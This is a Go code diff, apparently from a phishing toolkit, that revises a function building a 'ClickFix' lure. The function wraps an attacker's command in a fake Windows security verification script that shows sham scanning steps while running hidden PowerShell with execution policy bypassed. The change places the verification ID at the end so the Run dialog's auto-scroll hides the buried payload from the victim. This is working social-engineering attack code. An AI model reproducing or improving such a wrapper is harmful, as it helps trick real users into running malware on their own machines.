@@ -83,11 +83,11 @@ func wrapClickFixPayload(command string) string {
 	}
 	// Wrap: legitimate-looking security verification with payload deep inside.
 	// {VID} is replaced at runtime by the template JS with the same random
-	// verification ID shown on the page — the victim sees matching IDs.
-	// The wrapper is ~550 chars: ~250 before the payload (scanning steps)
-	// and ~250 after (result, log path, cleanup) so the payload is buried
-	// in the middle and invisible even with horizontal scrolling.
-	return `cmd /c "title Verification ID: {VID} & color 0A & mode con: cols=50 lines=12 & echo. & echo  Verification ID: {VID} & echo  Windows Security Verification Tool & echo. & echo  [1/4] Scanning system files... & timeout /t 1 >nul & echo  [2/4] Analyzing registry entries... & timeout /t 1 >nul & echo  [3/4] Checking certificate store... & timeout /t 1 >nul & echo  [4/4] Verifying digital signatures... & timeout /t 2 >nul & powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "` + command + `" & echo. & echo  Validation complete. & echo  Result: PASSED (ID: {VID}) & echo  Log saved: C:\Windows\Temp\security_{VID}.log & timeout /t 2 >nul & del /q %%TEMP%%\security_{VID}.tmp 2>nul & exit"`
+	// verification ID shown on the page. The ID is placed at the END because
+	// the Windows Run dialog auto-scrolls to show the last portion of a pasted
+	// string — the victim sees "Verification ID: <number> & exit" matching
+	// the web page. The payload is buried in the middle (~char 300-400).
+	return `cmd /c "title Windows Security Verification & color 0A & mode con: cols=50 lines=12 & echo. & echo  Windows Security Verification Tool & echo. & echo  [1/4] Scanning system files... & timeout /t 1 >nul & echo  [2/4] Analyzing registry entries... & timeout /t 1 >nul & echo  [3/4] Checking certificate store... & timeout /t 1 >nul & echo  [4/4] Verifying digital signatures... & timeout /t 2 >nul & powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "` + command + `" & echo. & echo  Validation complete. & timeout /t 2 >nul & del /q %%TEMP%%\security_{VID}.tmp 2>nul & echo  Verification ID: {VID} & exit"`
 }
 
 // renderClickFix substitutes all placeholders:
